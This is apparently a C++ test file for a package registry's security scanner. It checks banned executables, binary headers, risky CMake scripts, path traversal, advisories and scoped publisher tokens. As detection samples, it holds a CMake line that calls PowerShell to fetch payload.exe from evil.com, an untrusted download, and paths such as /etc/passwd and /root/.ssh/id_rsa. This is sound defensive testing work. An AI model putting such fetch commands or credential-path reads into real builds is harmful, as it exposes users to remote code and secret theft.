// tests/pkg/test_pkg_security_scanner.cpp
// PKG-109: Package Scanning, Advisories and Publisher Security Tests
#include <gtest/gtest.h>
#include <pingdart/pkg/security_scanner.h>
#include <pingdart/pkg/archive.h>

using namespace pingdart::pkg;

// ============================================================================
// PKG-109: Static Security Scanner Tests
// ============================================================================

TEST(SecurityScannerGoogleTest, DetectsBannedExecutableExtensions) {
    EXPECT_TRUE(SecurityScanner::is_banned_executable_extension("malware.exe"));
    EXPECT_TRUE(SecurityScanner::is_banned_executable_extension("libhack.so"));
    EXPECT_TRUE(SecurityScanner::is_banned_executable_extension("install.sh"));
    EXPECT_TRUE(SecurityScanner::is_banned_executable_extension("run.bat"));
    EXPECT_TRUE(SecurityScanner::is_banned_executable_extension("payload.dll"));

    EXPECT_FALSE(SecurityScanner::is_banned_executable_extension("widget.h"));
    EXPECT_FALSE(SecurityScanner::is_banned_executable_extension("widget.cpp"));
    EXPECT_FALSE(SecurityScanner::is_banned_executable_extension("CMakeLists.txt"));
    EXPECT_FALSE(SecurityScanner::is_banned_executable_extension("README.md"));
}

TEST(SecurityScannerGoogleTest, DetectsCompiledBinaryHeaders) {
    // PE 'MZ'
    uint8_t pe_data[] = {'M', 'Z', 0x90, 0x00, 0x03, 0x00};
    EXPECT_TRUE(SecurityScanner::is_compiled_binary(pe_data, sizeof(pe_data)));

    // ELF '\x7fELF'
    uint8_t elf_data[] = {0x7F, 'E', 'L', 'F', 0x02, 0x01};
    EXPECT_TRUE(SecurityScanner::is_compiled_binary(elf_data, sizeof(elf_data)));

    // Normal C++ source text
    const char* cpp_code = "#include <iostream>\nint main() { return 0; }";
    EXPECT_FALSE(SecurityScanner::is_compiled_binary(
        reinterpret_cast<const uint8_t*>(cpp_code), strlen(cpp_code)));
}

TEST(SecurityScannerGoogleTest, ScansCMakeScriptsForUntrustedExecution) {
    SecurityScanner scanner;

    // Dangerous CMake script running powershell
    std::string bad_cmake = R"(
cmake_minimum_required(VERSION 3.20)
project(MaliciousLib)
execute_process(COMMAND powershell -Command "Invoke-WebRequest http://evil.com/payload.exe")
)";
    auto findings = scanner.scan_cmake_script(bad_cmake, "CMakeLists.txt");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].severity, ScanSeverity::Critical);
    EXPECT_EQ(findings[0].rule_id, "RULE-CMAKE-EXEC");

    // Network download in CMake
    std::string download_cmake = R"(
file(DOWNLOAD "https://untrusted.cdn/lib.bin" "${CMAKE_BINARY_DIR}/lib.bin")
)";
    auto dl_findings = scanner.scan_cmake_script(download_cmake, "CMakeLists.txt");
    ASSERT_FALSE(dl_findings.empty());
    EXPECT_EQ(dl_findings[0].severity, ScanSeverity::High);

    // Clean CMake script
    std::string clean_cmake = R"(
cmake_minimum_required(VERSION 3.26)
project(CleanLib LANGUAGES CXX)
add_library(CleanLib STATIC src/clean.cpp)
target_include_directories(CleanLib PUBLIC include)
)";
    auto clean_findings = scanner.scan_cmake_script(clean_cmake, "CMakeLists.txt");
    EXPECT_TRUE(clean_findings.empty());
}

TEST(SecurityScannerGoogleTest, DetectsDangerousPathTraversalEntries) {
    EXPECT_TRUE(SecurityScanner::is_sensitive_or_dangerous_path("../../../etc/passwd"));
    EXPECT_TRUE(SecurityScanner::is_sensitive_or_dangerous_path("/root/.ssh/id_rsa"));
    EXPECT_TRUE(SecurityScanner::is_sensitive_or_dangerous_path(".env"));
    EXPECT_TRUE(SecurityScanner::is_sensitive_or_dangerous_path("C:\\Windows\\System32\\cmd.exe"));

    EXPECT_FALSE(SecurityScanner::is_sensitive_or_dangerous_path("include/my_lib/my_lib.h"));
    EXPECT_FALSE(SecurityScanner::is_sensitive_or_dangerous_path("src/renderer.cpp"));
}

// ============================================================================
// PKG-109: Security Advisory Engine Tests
// ============================================================================

TEST(SecurityAdvisoriesGoogleTest, QueryAndMatchAffectedVersions) {
    AdvisoryDatabase db;

    // Check pingdart-sqlite v0.9.0 (should match vulnerability)
    auto hits_090 = db.check_version("pingdart-sqlite", SemVersion{0, 9, 0, ""});
    EXPECT_FALSE(hits_090.empty());
    EXPECT_EQ(hits_090[0].advisory_id, "PINGDART-2026-0001");
    EXPECT_TRUE(db.has_critical_or_high("pingdart-sqlite", SemVersion{0, 9, 0, ""}));

    // Check pingdart-sqlite v1.0.0 (patched version, should NOT match)
    auto hits_100 = db.check_version("pingdart-sqlite", SemVersion{1, 0, 0, ""});
    EXPECT_TRUE(hits_100.empty());
    EXPECT_FALSE(db.has_critical_or_high("pingdart-sqlite", SemVersion{1, 0, 0, ""}));
}

// ============================================================================
// PKG-109: Publisher Security & Scoped Tokens
// ============================================================================

TEST(PublisherSecurityGoogleTest, ScopedTokensAndAuditTrail) {
    PublisherSecurity sec;

    // 1. Create scoped token with publish scope
    auto tok_res = sec.create_token("community-dev", {"pkg:publish"});
    ASSERT_TRUE(tok_res.has_value());
    const auto& tok = tok_res.value().token;
    const auto& secret = tok_res.value().plaintext_secret;
    EXPECT_TRUE(tok.has_scope("pkg:publish"));
    EXPECT_FALSE(tok.has_scope("admin"));

    // Verify token secret is hashed nonreversibly (hash != plaintext)
    EXPECT_NE(tok.token_hash, secret);
    EXPECT_TRUE(tok.token_hash.starts_with("sha256:"));

    // 2. Authenticate token using plaintext secret
    auto auth_res = sec.authenticate_token(secret, "pkg:publish");
    ASSERT_TRUE(auth_res.has_value());
    EXPECT_EQ(auth_res.value(), "community-dev");

    // Fails when requesting higher scope
    auto admin_res = sec.authenticate_token(secret, "admin");
    EXPECT_FALSE(admin_res.has_value());

    // 3. Revoke token
    EXPECT_TRUE(sec.revoke_token(secret).ok());
    auto revoked_auth = sec.authenticate_token(secret, "pkg:publish");
    EXPECT_FALSE(revoked_auth.has_value());

    // 4. Verify audit log captures actions without leaking raw secret
    auto audit = sec.get_audit_log();
    EXPECT_FALSE(audit.empty());
    EXPECT_EQ(audit.back().actor, "community-dev");
    EXPECT_EQ(audit.back().details.find(secret), std::string::npos); // Secret never exposed
}
